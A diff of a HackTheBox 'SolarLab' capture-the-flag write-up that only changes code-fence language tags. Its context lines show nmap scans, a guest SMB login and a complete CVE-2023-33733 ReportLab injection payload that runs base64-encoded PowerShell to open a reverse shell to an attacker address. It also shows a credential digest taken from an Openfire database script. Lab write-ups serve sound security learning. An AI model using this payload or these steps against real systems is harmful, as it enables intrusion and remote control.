@@ -29,7 +29,7 @@ I ran **`nmap 10.10.11.16 -vv -p- -T4`** first to see all available ports on thi
 
 As the nmap finished scanning all ports, here are the open ports on this box:
 
-```
+```jsx
 PORT     STATE SERVICE      REASON
 80/tcp   open  http         syn-ack
 135/tcp  open  msrpc        syn-ack
@@ -40,7 +40,7 @@ PORT     STATE SERVICE      REASON
 
 I will perform an aggressive scan on these ports using the command: **`nmap 10.10.11.16 -vv -p80,135,139,445,6791 -T4 -A`**.
 
-```
+```jsx
 PORT     STATE SERVICE       REASON  VERSION
 80/tcp   open  http          syn-ack nginx 1.24.0
 |_http-title: SolarLab Instant Messenger
@@ -73,7 +73,7 @@ As Nmap suggested that the supported methods were GET and HEAD, I used a HEAD re
 
 Nothing seems to be working here, including XSS, SQLi, etc. For now, I will explore another port. I ran **`smbclient //10.10.11.16/Documents -U Guest`**, which actually worked and logged me in.
 
-```
+```bash
 ┌──(root㉿kali)-[/HTB/SolarLab]
 └─# smbclient //10.10.11.16/Documents -U Guest
 Password for [WORKGROUP\Guest]:
@@ -125,7 +125,7 @@ I did some research on ReportHub and found a CVE related to it: [CVE-2023-33733]
 
 Here is the exploit code:
 
-```
+```html
 <p><font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANwA3ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
 exploit
 </font></p>
@@ -137,7 +137,7 @@ I used this request in the **`travel_request`** parameter of the **`/travelAppro
 
 And I got the user flag 
 
-```
+```powershell
 PS C:\Users\blake\Desktop> cat user.txt
 USERFLAG_REDACTED_HTB
 ```
@@ -192,7 +192,7 @@ After executing the command, I gained shell access for the user **`solarlab\open
 
 I discovered interesting credentials within the **`openfire.script`** file located at the **`PS C:\Program Files\Openfire\embedded-db\`** directory.
 
-```
+```plaintext
 // NOTE: ONLY IMPORTANT DETAILS EXTRACTED FRROM THE SCRIPT IS SHOWN BELOW
 CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
 
